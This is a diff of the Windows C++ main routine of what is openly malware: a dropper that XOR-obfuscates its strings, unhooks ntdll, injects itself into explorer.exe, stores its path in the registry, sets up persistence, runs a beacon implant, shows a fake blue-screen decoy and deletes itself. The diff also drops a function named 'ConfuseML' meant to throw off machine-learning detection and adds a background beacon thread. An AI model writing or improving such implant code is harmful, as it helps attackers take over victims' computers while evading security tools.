@@ -14,33 +14,25 @@
 #include <vector>
 #include <algorithm>
 #include <cwctype>
+#include <thread>
 
 namespace {
-    // "explorer.exe"
+    // "explorer.exe" -> \x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F
     std::wstring kExplorer = L"\x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F";
-    // "Volatile Environment"
-    std::wstring kVolatileEnv = L"\x0C\x35\x36\x3B\x2E\x33\x38\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E";
-    // "DropperPath"
-    std::wstring kDropperPath = L"\x1E\x28\x35\x2A\x2A\x3F\x28\x0A\x3B\x2E\x32";
 
-    void ConfuseML() {
-        std::vector<int> v = {1, 5, 2, 8, 3};
-        std::sort(v.begin(), v.end());
-    }
+    // "Volatile Environment" -> \x0C\x35\x36\x3B\x2E\x33\x38\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E
+    std::wstring kVolatileEnv = L"\x0C\x35\x36\x3B\x2E\x33\x38\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E";
+
+    // "DropperPath" -> \x1E\x28\x35\x2A\x2A\x3F\x28\x0A\x3B\x2E\x32
+    std::wstring kDropperPath = L"\x1E\x28\x35\x2A\x2A\x3F\x28\x0A\x3B\x2E\x32";
 
     std::vector<uint8_t> GetSelfImage() {
         wchar_t path[MAX_PATH];
         GetModuleFileNameW(NULL, path, MAX_PATH);
         HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-        if (hFile == INVALID_HANDLE_VALUE) {
-            LOG_ERR("GetSelfImage: CreateFileW failed.");
-            return {};
-        }
+        if (hFile == INVALID_HANDLE_VALUE) return {};
         DWORD size = GetFileSize(hFile, NULL);
-        if (size == INVALID_FILE_SIZE) {
-            CloseHandle(hFile);
-            return {};
-        }
+        if (size == INVALID_FILE_SIZE) { CloseHandle(hFile); return {}; }
         std::vector<uint8_t> buffer(size);
         DWORD read;
         ReadFile(hFile, buffer.data(), size, &read, NULL);
@@ -48,29 +40,20 @@ namespace {
         return buffer;
     }
 
-    bool IsSystemProcess() {
-        wchar_t path[MAX_PATH];
-        GetModuleFileNameW(NULL, path, MAX_PATH);
-        std::wstring sPath(path);
-        std::transform(sPath.begin(), sPath.end(), sPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
-
-        std::wstring explorer = utils::DecryptW(kExplorer);
-        // "svchost.exe"
-        std::wstring svchost = utils::DecryptW(L"\x29\x2C\x39\x32\x35\x28\x2E\x74\x3F\x22\x3F");
-
-        if (sPath.find(explorer) != std::wstring::npos) return true;
-        if (sPath.find(svchost) != std::wstring::npos) return true;
+    bool IsSystemProcess(const std::wstring& sPath) {
+        if (sPath.find(utils::DecryptW(kExplorer)) != std::wstring::npos) return true;
+        // "svchost.exe" -> \x29\x2C\x39\x32\x35\x28\x2E\x74\x3F\x22\x3F
+        if (sPath.find(utils::DecryptW(L"\x29\x2C\x39\x32\x35\x28\x2E\x74\x3F\x22\x3F")) != std::wstring::npos) return true;
         return false;
     }
 
-    bool IsRunningFromPersistLocation() {
-        wchar_t path[MAX_PATH];
-        GetModuleFileNameW(NULL, path, MAX_PATH);
-        std::wstring sPath(path);
-        std::transform(sPath.begin(), sPath.end(), sPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
-        if (sPath.find(L"\\microsoft\\onedrive\\") != std::wstring::npos) return true;
-        if (sPath.find(L"\\microsoft\\teams\\") != std::wstring::npos) return true;
-        if (sPath.find(L"\\microsoft\\windows\\update\\") != std::wstring::npos) return true;
+    bool IsRunningFromPersistLocation(const std::wstring& sPath) {
+        // Robust check: Is it in AppData or ProgramData AND NOT in Temp?
+        bool inAppData = (sPath.find(L"\\appdata\\local\\") != std::wstring::npos || sPath.find(L"\\appdata\\roaming\\") != std::wstring::npos);
+        bool inProgramData = (sPath.find(L"\\programdata\\") != std::wstring::npos);
+        bool inTemp = (sPath.find(L"\\temp\\") != std::wstring::npos || sPath.find(L"\\tmp\\") != std::wstring::npos);
+
+        if ((inAppData || inProgramData) && !inTemp) return true;
         return false;
     }
 }
@@ -82,72 +65,87 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     evasion::Unhooker::RefreshNtdll();
     evasion::SyscallResolver::GetInstance();
 
-    LOG_INFO("--- WINMAIN ---");
+    wchar_t currentPathBuf[MAX_PATH];
+    GetModuleFileNameW(NULL, currentPathBuf, MAX_PATH);
+    std::wstring currentPath(currentPathBuf);
+    std::transform(currentPath.begin(), currentPath.end(), currentPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
 
-    ConfuseML();
+    LOG_INFO("--- WINMAIN ---");
+    LOG_INFO("PATH: " + utils::ws2s(currentPath));
+
     Sleep(10000 + (GetTickCount() % 10000));
 
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
-    if (FAILED(hr)) {
-        LOG_ERR("CoInitializeEx failed.");
-        return 1;
-    }
+    if (FAILED(hr)) return 1;
 
-    if (IsSystemProcess()) {
-        LOG_INFO("IDENTIFIED: System process (Foothold).");
+    if (IsSystemProcess(currentPath)) {
+        LOG_INFO("ROLE: Foothold.");
+
         wchar_t dropperPath[MAX_PATH] = {0};
         HKEY hKey;
         if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
             DWORD sz = sizeof(dropperPath);
             if (RegQueryValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
-                LOG_INFO("IPC: Found dropper path: " + utils::ws2s(dropperPath));
-                Sleep(30000); // Wait for dropper to exit and self-delete
+                LOG_INFO("IPC: Found dropper: " + utils::ws2s(dropperPath));
+                Sleep(30000);
                 persistence::establishPersistence(dropperPath);
             }
             RegCloseKey(hKey);
         }
 
-        LOG_INFO("Starting beacon...");
         beacon::Beacon implant;
         implant.run();
         CoUninitialize();
         return 0;
     }
 
-    if (IsRunningFromPersistLocation()) {
-        LOG_INFO("IDENTIFIED: Persisted instance.");
+    if (IsRunningFromPersistLocation(currentPath)) {
+        LOG_INFO("ROLE: Persisted.");
         beacon::Beacon implant;
         implant.run();
         CoUninitialize();
         return 0;
     }
 
-    LOG_INFO("IDENTIFIED: Dropper.");
+    // Dropper instance
+    LOG_INFO("ROLE: Dropper.");
 
-    wchar_t selfPath[MAX_PATH];
-    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
     HKEY hKey;
     if (RegCreateKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        RegSetValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), 0, REG_SZ, (LPBYTE)selfPath, (DWORD)(wcslen(selfPath) + 1) * sizeof(wchar_t));
+        RegSetValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t));
         RegCloseKey(hKey);
-        LOG_INFO("IPC: Dropper path stored.");
+        LOG_INFO("IPC: Stored path.");
     }
 
     std::vector<uint8_t> selfImage = GetSelfImage();
+    bool relocated = false;
     if (!selfImage.empty()) {
-        LOG_INFO("Attempting injection into explorer.exe...");
+        LOG_INFO("Attempting relocation...");
         if (evasion::Injector::InjectIntoExplorer(selfImage)) {
-            LOG_INFO("Injection success. Exiting dropper.");
-            decoy::ShowBSOD();
-            CoUninitialize();
-            utils::SelfDeleteAndExit();
-            return 0;
+            LOG_INFO("Relocation success.");
+            relocated = true;
         }
     }
 
-    LOG_WARN("Direct persistence fallback.");
+    if (relocated) {
+        decoy::ShowBSOD();
+        CoUninitialize();
+        utils::SelfDeleteAndExit();
+        return 0;
+    }
+
+    LOG_WARN("Relocation failed. Becoming beacon.");
     persistence::establishPersistence();
+
+    // Run beacon in background during BSOD
+    std::thread beaconThread([]() {
+        beacon::Beacon implant;
+        implant.run();
+    });
+    beaconThread.detach();
+
     decoy::ShowBSOD();
+
     CoUninitialize();
     utils::SelfDeleteAndExit();
     return 0;
